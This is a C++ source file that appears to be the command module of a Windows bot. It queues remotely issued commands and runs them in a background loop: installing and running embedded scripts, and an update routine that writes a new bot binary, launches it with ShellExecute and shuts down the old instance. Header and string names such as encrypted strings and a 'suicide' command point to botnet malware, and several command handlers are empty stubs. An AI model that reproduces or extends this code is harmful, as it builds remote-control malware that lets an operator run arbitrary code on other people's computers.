#include "stdafx.h"
#include "commandmodule.h"
#include "kernel.h"
#include "sync.h"
#include "infodatabase.h"
#include "scriptmodule.h"
#include "cryptedstrings.h"
#include "installmodule.h"
#include "filesystem.h"

CommandModule::command_list_t * commandList;
CommandModule::command_list_t commandList_nil;

void CommandModule::init()
{
	commandList = &commandList_nil;
}

void CommandModule::uninit()
{

}

void CommandModule::addCommand(COMMAND_TYPE type, char * parameters, long parametersLength)
{
	HANDLE mutex = Kernel::waitForMutexOfObject(MUTEX_COMMANDMODULE);
	if (mutex == NULL) return;

	command_list_t * newCommandList = new command_list_t;
	newCommandList->next = commandList;
	newCommandList->command.type = type;
	newCommandList->command.parameters = new char[parametersLength];
	memcpy_s(newCommandList->command.parameters, parametersLength, parameters, parametersLength);
	newCommandList->command.parametersSize = parametersLength;
	commandList = newCommandList;

	Sync::_freeMutex(mutex);
}

static void stopServices()
{
	SetEvent(kernelData.globalEvents.stopEvent);
}

static void update(BYTE * newBot, DWORD newBotSize)
{
	CSTRW(param, bot_param_update);
	CSTRW(coreFile, path_update);

	WCHAR corePath[MAX_PATH];
	FileSystem::combinePath(corePath, kernelData.paths.home, coreFile);

	if (InstallModule::updateBot(coreFile, newBot, newBotSize))
	{
		CSTRW(shellOpen, windows_shellexec_open);
		ShellExecute(NULL, shellOpen, corePath, param, NULL, SW_SHOWDEFAULT);
		stopServices();
	}
}


void CommandModule::executeCommand(command_t const & command)
{
	switch (command.type)
	{
	case INSTALL_SCRIPT:
		InfoDatabase::addItem(&kernelData.database, InfoDatabase::TYPE_SCRIPT, command.parametersSize, NULL, command.parameters);
		break;
	case INSTALL_CRON_SCRIPT:

		break;
	case RUN_EMBED_SCRIPT:
		executeStringScript(command.parameters, NULL, NULL);
		break;
	case ADD_CRON_SCRIPT:
		break;
	case RUN_SCRIPT:
		
		break;
	case RUN_CRYPTED_SCRIPT:
		break;
	case UPDATE:
		update((BYTE *)command.parameters, command.parametersSize);
		break;
	case SUICIDE:
		break;

	default:
		WDEBUG("Unknown command type : " << command.type);
	}
}

DWORD WINAPI CommandModule::_procExecuteCommands(void * p)
{
	while (WaitForSingleObject(kernelData.globalEvents.stopEvent, 5000) == WAIT_TIMEOUT)
	{
		HANDLE mutex = Kernel::waitForMutexOfObject(MUTEX_COMMANDMODULE);
		if (mutex == NULL) continue;

		if (commandList != &commandList_nil)
		{
			command_t command = commandList->command;
			commandList = commandList->next;
			Sync::_freeMutex(mutex);
			executeCommand(command);
		}
		else
		{
			Sync::_freeMutex(mutex);
		}
	}
	return 0;
}

